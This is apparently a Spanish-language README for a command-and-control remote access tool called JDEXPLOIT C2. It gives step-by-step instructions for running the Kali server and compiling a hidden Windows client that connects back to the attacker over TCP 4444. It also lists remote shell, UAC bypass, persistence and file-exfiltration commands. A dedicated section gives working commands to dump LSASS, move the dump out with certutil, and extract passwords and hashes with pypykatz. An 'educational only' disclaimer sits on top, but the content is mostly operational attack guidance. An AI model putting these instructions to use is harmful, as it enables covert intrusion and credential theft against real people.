# 🔴 JDEXPLOIT C2 - RED/BLACK EDITION 🔴

**Remote Administration Tool - Educational Purpose Only**  
**SOLO ENTORNOS DE LABORATORIO AUTORIZADOS**

```
     ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
██   ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
╚█████╔╝██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
 ╚════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝

```

---

## 📋 **ÍNDICE**
1. [Características](#-características)
2. [Arquitectura](#-arquitectura)
3. [Requisitos](#-requisitos)
4. [Instalación Rápida](#-instalación-rápida)
5. [Servidor C2 (Kali)](#-servidor-c2-kali)
6. [Cliente Windows 11](#-cliente-windows-11)
7. [Comandos Disponibles](#-comandos-disponibles)
8. [Dumpear LSASS y Extraer Credenciales](#-dumpear-lsass-y-extraer-credenciales)
9. [Solución de Problemas](#-solución-de-problemas)
10. [Legal](#-legal)

<img width="1400" height="759" alt="image" src="https://github.com/user-attachments/assets/635280d4-d44a-44b2-b982-9998f02b74d8" />


---

## 🎯 **CARACTERÍSTICAS**

| Módulo | Funcionalidad | Estado |
|--------|---------------|--------|
| **C2 Core** | Servidor TCP multi-cliente | ✅ |
| **Web Dashboard** | Interfaz visual RED/BLACK | ✅ |
| **Shell Remoto** | Cualquier comando CMD | ✅ |
| **Ejecución** | Exec programas (calc, notepad) | ✅ |
| **Archivos** | Upload/Download completo | ✅ |
| **Procesos** | Listar y matar procesos | ✅ |
| **Info Sistema** | Hostname, IP, usuario, OS | ✅ |
| **Elevación** | Bypass UAC | ✅ |
| **LSASS Dump** | Extracción de credenciales | ✅ |
| **Anti-debug** | Ocultación de ventana | ✅ |
| **Persistencia** | Registro Windows | ✅ |
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8f801670-d7b1-4cf9-b276-6bc6904316fd" />

---

## 🏗 **ARQUITECTURA**

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│    KALI LINUX   │     │   PROTOCOLO     │     │   WINDOWS 11    │
│   (SERVIDOR)    │◄────┤   TCP/4444      │────►│   (CLIENTE)     │
│                 │     │   SIN CIFRAR    │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
         │                                              │
         ▼                                              ▼
   ┌─────────────┐                              ┌─────────────┐
   │   WEB UI    │                              │  PROCESOS   │
   │  :8080      │                              │  OCULTOS    │
   └─────────────┘                              └─────────────┘
```

---

## 📦 **REQUISITOS**

### **Kali Linux (Atacante):**
```bash
# Sistema operativo
- Kali Linux 2024+ / cualquier Linux con Python 3.8+
- Python 3.8 - 3.13

# Dependencias Python
- No requiere dependencias externas (solo módulos estándar)
```

### **Windows 11 (Víctima - LABORATORIO):**
```bash
# Sistema operativo
- Windows 10 / Windows 11 (cualquier versión)
- .NET Framework (no requerido, pero útil)

# Compilación (opcional - en Kali o Windows)
- MinGW-w64 (g++ para compilar)
- O Visual Studio 2022+
```

---

## ⚡ **INSTALACIÓN RÁPIDA**

### **PASO 1: Clonar/Descargar los archivos**
```bash
# En Kali
mkdir ~/JDEXPLOIT-C2
cd ~/JDEXPLOIT-C2
# Descarga c2_server.py y visualrat_client.cpp
```

### **PASO 2: Estructura de archivos**
```
JDEXPLOIT-C2/
├── c2_server.py              # Servidor C2 + Web Dashboard
├── visualrat_client.cpp      # Cliente Windows 11
└── README.md                 # Este archivo
```

---

## 🖥 **SERVIDOR C2 (KALI)**

### **1. Iniciar el servidor:**
```bash
cd ~/JDEXPLOIT-C2
python3 c2_server.py
```

**Output esperado:**
```
[🔥] JDEXPLOIT C2 - RED/BLACK EDITION
[🔥] C2 Core: 0.0.0.0:4444
[🔥] Web UI: http://0.0.0.0:8080
[🔥] C2 CORE LISTENING ON 0.0.0.0:4444
[🔥] Web dashboard: http://0.0.0.0:8080
```

### **2. Acceder al Dashboard:**
```
Abrir navegador → http://localhost:8080
```

---

## 🪟 **CLIENTE WINDOWS 11**

### **1. Configurar IP del servidor:**
En `visualrat_client.cpp`, **CAMBIAR LÍNEA ~30:**
```cpp
#define C2_SERVER "192.168.1.100"  // ← PON TU IP DE KALI
#define C2_PORT 4444
```

### **2. Compilar (en Kali con MinGW):**
```bash
# Instalar MinGW si no está
sudo apt update
sudo apt install mingw-w64 -y

# Compilar
x86_64-w64-mingw32-g++ -o JDEXPLOIT.exe visualrat_client.cpp \
    -static -static-libgcc -static-libstdc++ \
    -s -O2 -mwindows \
    -lws2_32 -liphlpapi -ladvapi32 -lshlwapi \
    -luser32 -lgdi32 -lpsapi
```

### **3. Compilar (en Windows con PowerShell):**
```powershell
x86_64-w64-mingw32-g++ -o RAT_Professional.exe visualrat_client.cpp -static -static-libgcc -static-libstdc++ -s -O2 -mwindows -lws2_32 -ladvapi32 -lcrypt32
```

### **4. Ejecutar en la víctima:**
```powershell
# SIMPLEMENTE DOBLE CLIC
# NO SE ABRE NINGUNA VENTANA
# EL PROCESO SE OCULTA AUTOMÁTICAMENTE
```

---

## 🎮 **COMANDOS DISPONIBLES**

### **📌 INFORMACIÓN DEL SISTEMA**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `info` | Información completa del sistema | `info` |
| `processes` | Lista todos los procesos | `processes` |

### **💻 SHELL REMOTO (CUALQUIER COMANDO CMD)**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `shell <cmd>` | Ejecuta cualquier comando | `shell whoami` |
| `shell ipconfig` | Ver IP | `shell ipconfig` |
| `shell netstat` | Conexiones de red | `shell netstat -an` |
| `shell systeminfo` | Info detallada | `shell systeminfo` |
| `shell dir` | Listar archivos | `shell dir C:\Users` |
| `shell type` | Ver contenido | `shell type archivo.txt` |
| `shell echo` | Crear archivo | `shell echo test > test.txt` |

### **🚀 EJECUTAR PROGRAMAS**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `exec <programa>` | Ejecuta cualquier programa | `exec calc.exe` |
| `exec notepad.exe` | Bloc de notas | `exec notepad.exe` |
| `exec cmd.exe` | Símbolo del sistema | `exec cmd.exe` |
| `exec powershell.exe` | PowerShell | `exec powershell.exe` |

### **📁 ARCHIVOS Y DIRECTORIOS**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `dir <path>` | Lista directorio | `dir C:\Windows` |
| `download <file>` | Descarga archivo | `download C:\temp\file.txt` |
| `upload` | Sube archivo (GUI) | Botón UPLOAD |

### **🔪 CONTROL DE PROCESOS**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `kill <PID>` | Mata un proceso | `kill 1234` |

### **⚡ ELEVACIÓN DE PRIVILEGIOS**
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `elevate` | Bypass UAC | `elevate` |

---

## 🔥 **DUMPEAR LSASS Y EXTRAER CREDENCIALES**

### **MÉTODO 1: PowerShell (SIN ARCHIVOS EXTRA)**
```bash
# 1. ELEVAR A SYSTEM (OBLIGATORIO)
> elevate

# 2. VERIFICAR
> shell whoami
# Debe mostrar: nt authority\system

# 3. DUMPEAR LSASS
> shell powershell -Command "$w=New-Object System.IO.FileStream('C:\Windows\Temp\lsass.dmp', [System.IO.FileMode]::Create); $p=Get-Process -Name lsass; $m=[System.Diagnostics.Process]::GetProcessById($p.Id).Modules[0]; $r=[System.IO.BinaryReader]::new([System.IO.File]::OpenRead($m.FileName)); $b=$r.ReadBytes($m.ModuleMemorySize); $w.Write($b,0,$b.Length); $w.Close()"

# 4. DESCARGAR (si funciona)
> download C:\Windows\Temp\lsass.dmp
```

### **MÉTODO 2: CERTUTIL (SI FALLA DOWNLOAD)**
```bash
# Convertir a Base64 y mostrar
> shell certutil -encodehex C:\Windows\Temp\lsass.dmp C:\Windows\Temp\lsass.txt && type C:\Windows\Temp\lsass.txt

# En Kali, copiar el output y decodificar:
cat > lsass.b64
# (PEGAR AQUÍ)
# Ctrl+D
cat lsass.b64 | base64 -d > lsass.dmp
```

### **EXTRACCIÓN EN KALI**
```bash
# Instalar pypykatz
sudo apt install pypykatz -y
# o
pip install pypykatz

# Extraer credenciales
pypykatz lsa minidump lsass.dmp
```

**OUTPUT ESPERADO:**
```
== LogonSession ==
username: joantorgar
domain: MONLAU
Password: SuperSecret123!
NT Hash: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

---

## ⚠️ **LEGAL DISCLAIMER**

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ESTE SOFTWARE ES EXCLUSIVAMENTE PARA FINES EDUCATIVOS Y DE INVESTIGACIÓN  ║
║                                                                              ║
║   ⚠️  EL USO NO AUTORIZADO ES ILEGAL Y CONSTITUYE UN DELITO  ⚠️             ║
║                                                                              ║
║   ● Este programa debe usarse SOLO en equipos propios o con AUTORIZACIÓN    ║
║     EXPLÍCITA Y POR ESCRITO del propietario del sistema.                    ║
║                                                                              ║
║   ● El desarrollador NO SE HACE RESPONSABLE del mal uso de este software.   ║
║                                                                              ║
║   ● Al descargar y usar este software, usted acepta TODA la responsabilidad ║
║     legal sobre sus acciones.                                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

---

## 📜 **LICENCIA**

**MIT License** - Solo para uso educativo.

Queda **PROHIBIDO** el uso de este software para:
- ❌ Acceder a sistemas sin autorización
- ❌ Robar información personal o credenciales
- ❌ Actividades maliciosas de cualquier tipo
- ❌ Distribución de malware

---

## 👤 **AUTOR**

**JDEXPLOIT** - Red Team Operator / Cybersecurity Researcher

```
██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝

```

**🔴 RED/BLACK EDITION v1.0**  
*Educational Purpose Only*

---

**¿Preguntas? ¿Sugerencias?**  
**JDEXPLOIT - 2026**

---

```
🔥🔥🔥 SOLO ENTORNOS AUTORIZADOS 🔥🔥🔥
```
